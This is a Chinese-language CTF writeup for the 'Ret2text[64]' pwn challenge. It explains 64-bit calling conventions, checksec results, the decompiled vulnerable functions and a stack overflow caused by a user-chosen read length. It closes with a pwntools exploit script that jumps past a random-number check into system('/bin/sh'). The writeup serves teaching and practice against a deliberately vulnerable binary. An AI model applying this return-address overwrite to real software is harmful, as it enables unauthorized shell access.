---
title: Ret2text[64]
author: 13m0n4de
difficulty: Normal
category: Pwn
image: ghcr.io/svuctf/svuctf-helloworld-2024/ret2text64:latest
port: 70
writeup_author: pn1fg
tags:
  - ret2text
reference:
---

# Ret2text\[64\]

## 题目描述

## 题目解析

这是 `ret2text32` 的升级版，64 位程序与 32 位不同，函数通过寄存器来传参，并且内存地址大小为 8 字节而不是 4 字节。

64 位程序传参：

参数：a，b，c，d，e，f，g，h

- 前 6 个：a->%rdi，b->%rsi，c->%rdx，d->%rcx，e->%r8，f->%r9
- 从第七个开始恢复到 32 位传参方式，从右至左压入栈中

### 查看文件信息

查看文件类型：

```
$ file ret2text64
ret2text64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9878ecbc44383c00e0f0009da41011932cffa587, for GNU/Linux 3.2.0, not stripped
```

64位 ELF 文件，动态链接，没有去除符号。

查看保护机制：

```
$ checksec --file=ret2text64
RELRO           Partial RELRO
STACK CANARY    No canary found
NX              NX enabled
PIE             No PIE
RPATH           No RPATH
RUNPATH	        No RUNPATH
Symbols		    77 Symbols
FORTIFY	        No
Fortified	    0
Fortifiable	    1
FILE            ret2text64
```

NX 保护。

### 分析漏洞成因

反编译 `vuln` 函数：

```c
[0x00401130]> s sym.vuln
[0x0040135a]> pdg

int vuln()
{
  char buf[44]; // [rsp+0h] [rbp-30h] BYREF
  int v2; // [rsp+2Ch] [rbp-4h] BYREF

  puts("Welcome to the secret data vault!");
  puts("How much data do you want to store (in bytes)?");
  __isoc99_scanf("%d", &v2);
  puts("Enter your secret data now:");
  read(0, buf, v2);
  return puts("Data stored successfully!");
}
```

本题函数的漏洞点在 `scanf` 函数与 `read` 函数处：

- `read` 函数从标准输入，读取大小为 `v2` 的数据存入 `buf` 数组中
- `buf` 的大小为 0x30，`v2` 的大小由 `scanf` 函数接收的为准

所以这题的输入大小由我们决定，可以超出 `buf` 的长度，造成栈溢出。

反编译 `b4ckd00r` 函数：

```c
[0x0040135a]> s sym.b4ckd00r
[0x004012d6]> pdg

int b4ckd00r()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  int buf; // [rsp+8h] [rbp-8h] BYREF
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  close(fd);
  __isoc99_scanf("%d", &v1);
  if ( v1 == buf )
    return system("/bin/sh");
  else
    return puts("Hacker!");
}
```

程序首先使用 `read` 函数从 `/dev/urandom` 中读取 4 个字节的数据存入 buf 中，紧接着用 `scanf` 读取一个整数存入 `v1` 中，然后条件判断，`v1` 与 `buf` 相等即可获取 shell。

看了[猜数字](../srand/README.md)题解的选手可能会想到：预测随机数使得 `v1 == buf` 判断成功从而获取 shell。

但这里使用的是 `/dev/urandom`，它是 Linux 系统提供的一个密码学安全的伪随机数生成器：

- 与 `srand` + `rand` 这类伪随机数不同，它从系统熵池收集随机性
- 满足密码学应用的随机性要求，输出在统计和计算上都不可预测
- 即使知道前一个随机数，也无法推测下一个随机数

所以这里我们需要考虑其他的利用方式。

反汇编 `vuln` 函数：

```asm
[0x004012d6]> pdf
┌ 132: sym.b4ckd00r ();
│           ; var int64_t fildes @ rbp-0x4
│           ; var void *buf @ rbp-0x8
│           ; var int64_t var_ch @ rbp-0xc
│           0x004012d6      f30f1efa       endbr64
│           0x004012da      55             push rbp
│           0x004012db      4889e5         mov rbp, rsp
│           0x004012de      4883ec10       sub rsp, 0x10
│           0x004012e2      be00000000     mov esi, 0                  ; int oflag
│           0x004012e7      488d3de10d..   lea rdi, str._dev_urandom   ; 0x4020cf ; "/dev/urandom" ; const char *path
│           0x004012ee      b800000000     mov eax, 0
│           0x004012f3      e818feffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x004012f8      8945fc         mov dword [fildes], eax
│           0x004012fb      488d4df8       lea rcx, [buf]
│           0x004012ff      8b45fc         mov eax, dword [fildes]
│           0x00401302      ba04000000     mov edx, 4                  ; size_t nbyte
│           0x00401307      4889ce         mov rsi, rcx                ; void *buf
│           0x0040130a      89c7           mov edi, eax                ; int fildes
│           0x0040130c      e8dffdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00401311      8b45fc         mov eax, dword [fildes]
│           0x00401314      89c7           mov edi, eax                ; int fildes
│           0x00401316      e8c5fdffff     call sym.imp.close          ; int close(int fildes)
│           0x0040131b      488d45f4       lea rax, [var_ch]
│           0x0040131f      4889c6         mov rsi, rax
│           0x00401322      488d3db30d..   lea rdi, [0x004020dc]       ; "%d" ; const char *format
│           0x00401329      b800000000     mov eax, 0
│           0x0040132e      e8edfdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00401333      8b55f4         mov edx, dword [var_ch]
│           0x00401336      8b45f8         mov eax, dword [buf]
│           0x00401339      39c2           cmp edx, eax
│       ┌─< 0x0040133b      750e           jne 0x40134b
│       │   0x0040133d      488d3d9b0d..   lea rdi, str._bin_sh        ; 0x4020df ; "/bin/sh" ; const char *string
│       │   0x00401344      e887fdffff     call sym.imp.system         ; int system(const char *string)
│      ┌──< 0x00401349      eb0c           jmp 0x401357
│      ││   ; CODE XREF from sym.b4ckd00r @ 0x40133b(x)
│      │└─> 0x0040134b      488d3d950d..   lea rdi, str.Hacker_        ; 0x4020e7 ; "Hacker!" ; const char *s
│      │    0x00401352      e869fdffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from sym.b4ckd00r @ 0x401349(x)
│      └──> 0x00401357      90             nop
│           0x00401358      c9             leave
└           0x00401359      c3             ret
```

我们来看一下汇编代码，如果让程序不回到 `vuln` 函数的开头，而是返回到 `0x0040133d` 处，即 `lea rdi, str._bin_sh` 这条汇编语句处。

从这里开始往下执行，那我们就可以绕过上面的条件判断语句，直接拿到 shell。

### 编写利用程序

[exp.py](./writeup/exp.py):

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("../attachments/ret2text64")
elf = ELF("../attachments/ret2text64")

system_bin_sh = 0x0040133D

payload = flat([cyclic(0x30), "A" * 8, system_bin_sh])

io.sendlineafter("How much data do you want to store (in bytes)?\n", b"200")
io.sendafter("Enter your secret data now:\n", payload)

io.interactive()
```
